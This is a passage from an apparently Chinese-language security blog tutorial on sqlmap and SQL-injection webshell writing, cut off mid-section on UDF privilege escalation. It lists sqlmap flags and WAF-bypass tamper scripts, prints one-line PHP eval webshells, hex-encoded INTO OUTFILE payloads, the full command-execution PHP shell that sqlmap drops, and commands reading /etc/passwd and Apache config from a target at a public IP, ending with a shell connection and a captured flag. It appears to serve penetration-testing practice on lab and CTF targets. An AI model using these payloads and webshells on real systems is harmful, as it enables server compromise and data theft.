&quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --sql-shell  #执行指定的sql语句</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上</span><br><span class="line"> </span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --file-read &quot;c:/test.txt&quot; #读取目标服务器C盘下的test.txt文件</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --file-write  test.txt  --file-dest &quot;e:/hack.txt&quot;  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbms=&quot;MySQL&quot;     #指定其数据库为mysql </span><br><span class="line">其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, sqli-labste, Sybase, Vertica, eXtremeDB</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --random-agent   #使用任意的User-Agent爆破</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --proxy=&quot;http://127.0.0.1:8080&quot;    #指定代理</span><br><span class="line">当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。</span><br><span class="line">支持的探测方式如下：</span><br><span class="line">　　B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">　　E: Error-based SQL injection（报错型注入）</span><br><span class="line">　　U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">　　S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">　　T: Time-based blind SQL injection（基于时间延迟注入）</span><br><span class="line">  </span><br><span class="line">sqlmap -d &quot;mysql://root:root@127.0.0.130:3306/mysql&quot; --os-shell   #知道网站的账号密码直接连接</span><br><span class="line"> </span><br><span class="line">-v3                   #输出详细度  最大值5 会显示请求包和回复包</span><br><span class="line">--threads 5           #指定线程数</span><br><span class="line">--fresh-queries       #清除缓存</span><br><span class="line">--flush-session       #清空会话，重构注入 </span><br><span class="line">--batch               #对所有的交互式的都是默认的</span><br><span class="line">--random-agent        #任意的http头</span><br><span class="line">--tamper base64encode            #对提交的数据进行base64编码</span><br><span class="line">--referer http://www.baidu.com   #伪造referer字段</span><br><span class="line"> </span><br><span class="line">--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="绕WAF"><a href="#绕WAF" class="headerlink" title="绕WAF"></a>绕WAF</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>只用–tamper对参数进行修改来绕过waf，官方提供的绝大部分脚本是用正则模块替换攻击载荷字符编码的方式来绕过waf的检测规则。</p><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--identify-waf   检测是否有WAF</span><br><span class="line"> </span><br><span class="line">#使用参数进行绕过</span><br><span class="line">--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候</span><br><span class="line">--time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时</span><br><span class="line">--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上</span><br><span class="line">--proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过</span><br><span class="line">--ignore-proxy    禁止使用系统的代理，直接连接进行注入</span><br><span class="line">--flush-session   清空会话，重构注入</span><br><span class="line">--hex 或者 --no-cast     进行字符码转换</span><br><span class="line">--mobile          对移动端的服务器进行注入</span><br><span class="line">--tor             匿名注入</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sqlmap为我们准备了绕过waf的脚本，在sqlmap文件夹tamper文件夹下<br>使用情况如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用方法--tamper xxx.py</span><br><span class="line">apostrophemask.py用UTF-8全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</span><br><span class="line">equaltolike.py 用“LIKE”运算符替换全部等于号“=”</span><br><span class="line">greatest.py 用“GREATEST”函数替换大于号“&gt;”</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class="line">percentage.py 在每个字符之前添加一个百分号</span><br><span class="line">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class="line">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class="line">securesphere.py 添加经过特殊构造的字符串</span><br><span class="line">sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</span><br><span class="line">space2comment.py 用“/**/”替换空格符</span><br><span class="line">space2dash.py 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</span><br><span class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mysqldash.py 用破折号注释符“--”其次是一个换行符替换空格符</span><br><span class="line">space2plus.py 用加号“+”替换空格符</span><br><span class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</span><br><span class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class="line">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</span><br><span class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class="line">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="level-risk"><a href="#level-risk" class="headerlink" title="-level&#x2F;-risk"></a>-level&#x2F;-risk</h3><p>Sqlmap一共有5个探测等级,默认是1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多 ，会自动破解出cookie、XFF等头部注入。当然,等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试,HTTP cookie在level为2时就会测试，HTTP User-Agent&#x2F;Referer头在level为3时就会测试。 在不确定哪个参数为注入点时，为为保证准确.性,建议设置level为5</p><p>Sqlmap一共有3个危险等级, 也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思， 在不确定的情况下，建议设置为3级，–risk&#x3D;3</p><p>工具使用payload目录<br>sqlmap\data\xml\payloads（windows）</p><p>伪造Http Referer头部<br>sqlmap可以在请求中伪造http请求头中的referer，当-level大于等于3时，会进行referer注入<br>eg: referer <code>http://www.topreverse.cn</code></p><h3 id="执行指定的SQL语句"><a href="#执行指定的SQL语句" class="headerlink" title="执行指定的SQL语句"></a>执行指定的SQL语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --sql-shell  #执行指定的sql语句</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605e43b6e.png" alt="image-20240309202957671"></p><h3 id="执行OS系统命令"><a href="#执行OS系统命令" class="headerlink" title="执行OS系统命令"></a>执行OS系统命令</h3><p>当且仅当数据库是mysql、postgresql、sql server时可以执行。<br>当数据库是mysql时，需要满足3个条件：<br>1、root权限<br>2、已经知道目标站点的绝对路径<br>3、secure_file_priv的参数值时空（未修改前是NULL）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --os-shell  #执行--os-shell命令</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605df3431.png" alt="image-20240309203114502"></p><p>过程中sqlmap会向指定路径传入两个文件，tmpblwkd.php（木马文件）和tmpueqch.php。退出时输入q和x才可以删除传入的文件。</p><h3 id="读取服务器文件"><a href="#读取服务器文件" class="headerlink" title="读取服务器文件"></a>读取服务器文件</h3><p>前提：数据库是：mysql、postgresql和sql server</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --file-read &quot;c:/topreverse.txt&quot; #读取目标服务器C盘下的test.txt文件</span><br></pre></td></tr></table></figure><p>上传文件到数据库服务器<br>前提：数据库是mysql、postgre sql、sql server</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-2/?id=1 --file-write C:\Users\system32\Desktop\text.php --file-dest &quot;C:\phpStudy\PHPTutorial\WWW\test.php&quot;  #将本地的text.php文件上传到目标服务器test.php</span><br></pre></td></tr></table></figure><p>sqlmap自身上传完成之后会进行验证，读取文件大小进行对比。</p><h1 id="SQL写马"><a href="#SQL写马" class="headerlink" title="SQL写马"></a>SQL写马</h1><h2 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><h4 id="1-此方法利用的先决条件"><a href="#1-此方法利用的先决条件" class="headerlink" title="1.此方法利用的先决条件"></a>1.此方法利用的先决条件</h4><ul><li><p>web目录具有写权限，能够使用单引号</p></li><li><p>知道网站绝对路径（根目录，或则是根目录往下的目录都行）</p></li><li><p>secure_file_priv没有具体值（在mysql&#x2F;my.ini中查看）</p></li><li><p>最好网站是root权限</p></li></ul><h4 id="2-secure-file-priv"><a href="#2-secure-file-priv" class="headerlink" title="2.secure_file_priv"></a>2.secure_file_priv</h4><p>secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。如下关于secure_file_priv的配置介绍</p><p><code>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</code></p><p>所以如果我们要想使用into outfile函数写入一句话的话就需要将secure_file_priv 的值设为没有值，那如何设置了？修改secure_file_priv 的值只能通过手动打开配置文件进行修改，不能直接使用sql语句进行修改</p><p>（1）看secure-file-priv参数的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p>如下，secure_file_priv 的值默认为NULL，则表示限制mysqld 不允许导入|导出</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b1980f.png" alt="image-20240309213850241"></p><p>（2）修改secure_file_priv 的值</p><p>我们可以在mysql&#x2F;my.ini中查看是否有secure_file_priv 的参数，如果没有的话我们就添加 secure_file_priv &#x3D; ‘’ 即可</p><p><img src="https://bu.dusays.com/2024/05/13/6641605abbc58.png" alt="image-20240309213819001"></p><p>此时再查看secure_file_priv的值如下已经变为空了</p><p><img src="https://bu.dusays.com/2024/05/13/6641605a6d4e7.png" alt="image-20240309213241536"></p><p>设置完成后我们就可以利用这个函数来写入一句话木马</p><p><strong>outfile还有一个”兄弟”时dumpfile</strong> </p><p>两者的区别是dumpfile只能导出一行，而outfile支持多行，dumpfile保留数据的原始格式未进行转义，而outfile会对数据进行转义</p><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>我们以sqli-labs第七关为例</p><h4 id="1-注入点判断"><a href="#1-注入点判断" class="headerlink" title="1.注入点判断"></a>1.注入点判断</h4><p>输入正确的语法正常显示，错误的语法显示说语法错误，页面只存在两种状态，判断为盲注。我们输入?id&#x3D;3’)) and sleep(5) –+时成功延时，所以注入点就为3’))，我们输入的字符被包含在单引号中，且单引号外有两个双引号包裹</p><p><img src="https://bu.dusays.com/2024/05/13/6641605cc6295.png" alt="image-20240309212953403"></p><h4 id="2-判断列数"><a href="#2-判断列数" class="headerlink" title="2.判断列数"></a>2.判断列数</h4><p>我们使用order by 语句判断列数，order by 3时，正常显示，4时不正常，判断为3列</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ce5806.png" alt="image-20240309212923779"></p><h4 id="3-写入webshell"><a href="#3-写入webshell" class="headerlink" title="3.写入webshell"></a>3.写入webshell</h4><p>加如此前我们已经通过一些方法获取到了网站的根目录，则可以写入一句话 “ <code>&lt;?php eval($_REQUEST[1]);?&gt; </code>”。一句话建议进行十六进制转码（不用编码也可以） </p><p><img src="https://bu.dusays.com/2024/05/13/6641605abe0b1.png" alt="image-20240309212843043"></p><p>编码后，然后在最前面加上 0x。如下我们将一句话木马进行十六进制编码后写入了根目录下的outfile.php文件中</p><p><code>http://106.15.50.112:8023/?r=content&amp;cid=-1%20and(1)UNION SELECT 1,2,3,4,5,6,7,8,9,10,&lt;?php @eval($_REQUEST[&#39;aaa&#39;]);?&gt;,12,13 into outfile &quot;/var/www/html/aaa.php&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-3&#x27;)) union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile &#x27;C:\\Users\\Administrator.WIN2012\\Desktop\\ph</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605e15d6c.png" alt="image-20240309212821210"></p><p>成功写入，<strong>这里网站的目录要使用双斜杠</strong>不然会写不进去，第一个斜杠是转义的意思，字符串解析不仅仅局限于C编译器，Java编译器、一些配置文件的解析、Web服务器等等，都会遇到对字符串进行解析的这个问题，由于传统的 Windows采用的是单个斜杠的路径分隔形式，导致在对文件路径进行解析的时候可能发生不必要的错误，所以就出现了用双反斜杠”\“分隔路径的形式。 不管解析引擎是否将反斜杠解析成转义字符，最终在内存中得到的都是”&quot;，结果也就不会出问题了。</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ae93b5.png" alt="image-20240309212740673"></p><h4 id="4-连接webshell"><a href="#4-连接webshell" class="headerlink" title="4.连接webshell"></a>4.连接webshell</h4><p>成功连接</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b91e13.png" alt="image-20240309212708078"></p><p>如果我们将 secure_file_priv的值为设置为null，我们在进行上面的写入操作发现并没有写进去。</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ac4c04.png" alt="image-20240309212649362"></p><p>所以没有写进去的情况有两种：</p><ul><li>网站的路径不对，或者没有使用双斜杠进行转义</li><li>secure_file_priv的值不是为空</li></ul><h2 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>–os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件</p><p>此为sqlmap的一个命令，利用这条命令的先决条件：</p><p>要求为数据库DBA，使用–is-dba查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba<br>secure_file_priv没有具体值<br>知道网站的绝对路径</p><h3 id="使用-5"><a href="#使用-5" class="headerlink" title="使用"></a>使用</h3><p>我们以sqli-labs第一关为例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.43.145/2_Shotting_Range/sql/Less-1/?id=1 --os-shell</span><br></pre></td></tr></table></figure><p>这里需要我们选择网站的脚本语言，和网站根路径</p><p>[1] common location(s) (‘C:&#x2F;xampp&#x2F;htdocs&#x2F;, C:&#x2F;wamp&#x2F;www&#x2F;, C:&#x2F;Inetpub&#x2F;wwwroot&#x2F;‘) (default) #sqlmap自带测试常规路径<br>[2] custom location(s) #自己填写绝对路径<br>[3] custom directory list file #自己填写目录字典，我们将字典所在的路径传过去就行<br>[4] brute force search #爆破路径</p><p><img src="https://bu.dusays.com/2024/05/13/6641605e0acb5.png" alt="image-20240309212513030"></p><p>sqlmap在指定的目录生成了两个文件（文件名是随机的，并不是固定的）：</p><p>tmpbeewq.php 用来执行系统命令<br>tmpuqvgw.php 用来上传文件</p><p><img src="https://bu.dusays.com/2024/05/13/6641605abcf3b.png" alt="image-20240310123947689"></p><p><img src="https://bu.dusays.com/2024/05/13/6641605d631d1.png" alt="image-20240309212253989"></p><ol><li>tmpbeewq.php的文件内容为</li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>,<span class="number">0</span>);<span class="variable">$z</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))&#123;<span class="variable">$z</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);<span class="variable">$z</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);<span class="variable">$z</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>,<span class="variable">$z</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$z</span>=<span class="keyword">array</span>();&#125;<span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;<span class="keyword">global</span> <span class="variable">$z</span>;<span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>)<span class="keyword">and</span>!<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>,<span class="variable">$z</span>);&#125;<span class="keyword">if</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>))&#123;<span class="title function_ invoke__">ob_start</span>();<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);<span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>))&#123;<span class="variable">$y</span>=<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);<span class="variable">$w</span>=<span class="literal">NULL</span>;<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;<span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);&#125;@<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>))&#123;<span class="variable">$w</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>))&#123;<span class="title function_ invoke__">ob_start</span>();<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);<span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>))&#123;<span class="variable">$x</span>=<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,r);<span class="variable">$w</span>=<span class="literal">NULL</span>;<span class="keyword">if</span>(<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>))&#123;<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>))&#123;<span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>,<span class="number">512</span>);&#125;&#125;@<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">array</span>();<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$w</span>);<span class="variable">$w</span>=<span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>),<span class="variable">$w</span>).<span class="title function_ invoke__">chr</span>(<span class="number">10</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$w</span>=<span class="number">0</span>;&#125;<span class="keyword">echo</span><span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问一下</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b8678b.png" alt="image-20240309212158771"></p><ol start="2"><li>使用tmpuqvgw.php上传文件</li></ol><p>我们上传一个php的一句话后门</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c9578c.png" alt="image-20240309212059564"></p><p>访问</p><p><img src="https://bu.dusays.com/2024/05/13/6641605d2de48.png" alt="image-20240309212338071"></p><p><strong>所以这两种方式都需要知道网站的绝对路径才行。</strong></p><p>补充：</p><p>上面说了sqlmap写入webshell的方式有三种，缺一不可</p><ul><li>web目录具有写权限，能够使用单引号</li><li>知道网站绝对路径</li><li>secure_file_priv没有具体值（在mysql&#x2F;my.ini中查看）</li></ul><h2 id="如何寻找web文件路径"><a href="#如何寻找web文件路径" class="headerlink" title="如何寻找web文件路径"></a>如何寻找web文件路径</h2><p>web应用的位置默认都在**&#x2F;var&#x2F;www&#x2F;html&#x2F;，<strong>我们一般网页的文件都是在这上面，但是如果开发者设计的话可以在</strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;** 后修改网页文件存放位置。</p><h3 id="利用mysql的函数"><a href="#利用mysql的函数" class="headerlink" title="利用mysql的函数"></a>利用mysql的函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://106.15.50.112:8023/?r=content&amp;cid=15&#x27; --dbms &quot;mysql&quot;  --file-read &quot;/etc/passwd&quot; --technique U</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605b6b76b.png" alt="image-20240309215148900"></p><p> 当然 sqlmap得到得信息不会显示出来，而是会在保存在sqlmap的文件夹中。</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b6ea6c.png" alt="image-20240309215429365"></p><p> 找到文件位置，打开文件（注意是  .local   有个 “.” 需要注意）</p><p><img src="https://bu.dusays.com/2024/05/13/6641605cdfbf8.png" alt="image-20240309215307860"></p><p><img src="https://bu.dusays.com/2024/05/13/6641605d7e868.png" alt="image-20240309215451151"></p><p> 没有关键信息，我们再查看其他的配置文件（这种文件名，一般情况都是默认）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://106.15.50.112:8023/?r=content&amp;cid=15&#x27; --dbms &quot;mysql&quot;  --file-read &quot;/etc/init.d/httpd&quot; --technique U</span><br></pre></td></tr></table></figure><p>得到关键config文件的路径</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c966bf.png" alt="image-20240309215530002"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://106.15.50.112:8023/?r=content&amp;cid=15&#x27; --dbms &quot;mysql&quot;  --file-read &quot;/etc/httpd/conf/httpd.conf&quot; --technique U</span><br></pre></td></tr></table></figure><p>找到的web文件放置的路径，这就是我们要上传木马的路径</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c97a1f.png" alt="image-20240309215547389"></p><p> 接下来手动用sqlmap 写马都可以，这里选的是手动</p><p>写马POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://106.15.50.112:8023/?r=content&amp;cid=-1%20and(1)UNION SELECT 1,2,3,4,5,6,7,8,9,10,&lt;?php @eval($_REQUEST[&#x27;aaa&#x27;]);?&gt;,12,13 into outfile &quot;/var/www/html/whalwl/aaa.php&quot;</span><br></pre></td></tr></table></figure><p>继续检测</p><p><img src="https://bu.dusays.com/2024/05/13/6641605ba3e3b.png" alt="image-20240309220011003"></p><p> 这里又失败了，为什么了呢？，又涉及到经验问题了，服务器一般不会给web根目录写文件的权限（实际上能sql注入写马的条件比较苛刻），不过我们可以继续寻找子文件夹，看是否能上传。</p><p>下面也不啰嗦了，发现，直接是能上传到 image 目录下，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://106.15.50.112:8023/?r=content&amp;cid=-1%20and(1)UNION SELECT 1,2,3,4,5,6,7,8,9,10,&quot;&lt;?php @eval($_REQUEST[&#x27;aaa&#x27;]);?&gt;&quot;,12,13 into outfile &quot;/var/www/html/whalwl/images/aaa.php&quot;</span><br></pre></td></tr></table></figure><p> shell管理工具连接</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c791fd.png" alt="image-20240309220056634"></p><p> 看到flag<br><img src="https://bu.dusays.com/2024/05/13/6641605deedfe.png" alt="image-20240309220112713"></p><h3 id="–sql-shell"><a href="#–sql-shell" class="headerlink" title="–sql-shell"></a>–sql-shell</h3><p>我们可以先使用这个来执行一些sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;xxx&quot; --sql-shell</span><br></pre></td></tr></table></figure><p>查看文件路径（mysql&#x2F;data的路径，根目录一般与mysql处于同一目录）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@datadir;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641605cf2308.png" alt="image-20240309211749043"></p><p>查看secure_file_priv的值是否为空</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv </span><br></pre></td></tr></table></figure><p>如下为null，无法写入</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b3bf4b.png" alt="image-20240309211650715"></p><p>当为空的时候则什么都不返回</p><p><img src="https://bu.dusays.com/2024/05/13/6641605c297d1.png" alt="image-20240309211636404"></p><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><p>1.phpinfo()</p><p>2.随便传入参数 报错 可能有相关信息</p><p>3.指纹信息收集</p><p><img src="https://bu.dusays.com/2024/05/13/6641605daaac3.png" alt="image-20240310122613276"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在实际上我们用木马连接后，权限可能很小</p><p>详细如下：<a href="https://www.freebuf.com/articles/network/268221.html">提权详解</a></p><p>这里采用UDF提权的方法</p><p><strong>这里的udf提权是应用程序或服务提权</strong></p><p><a 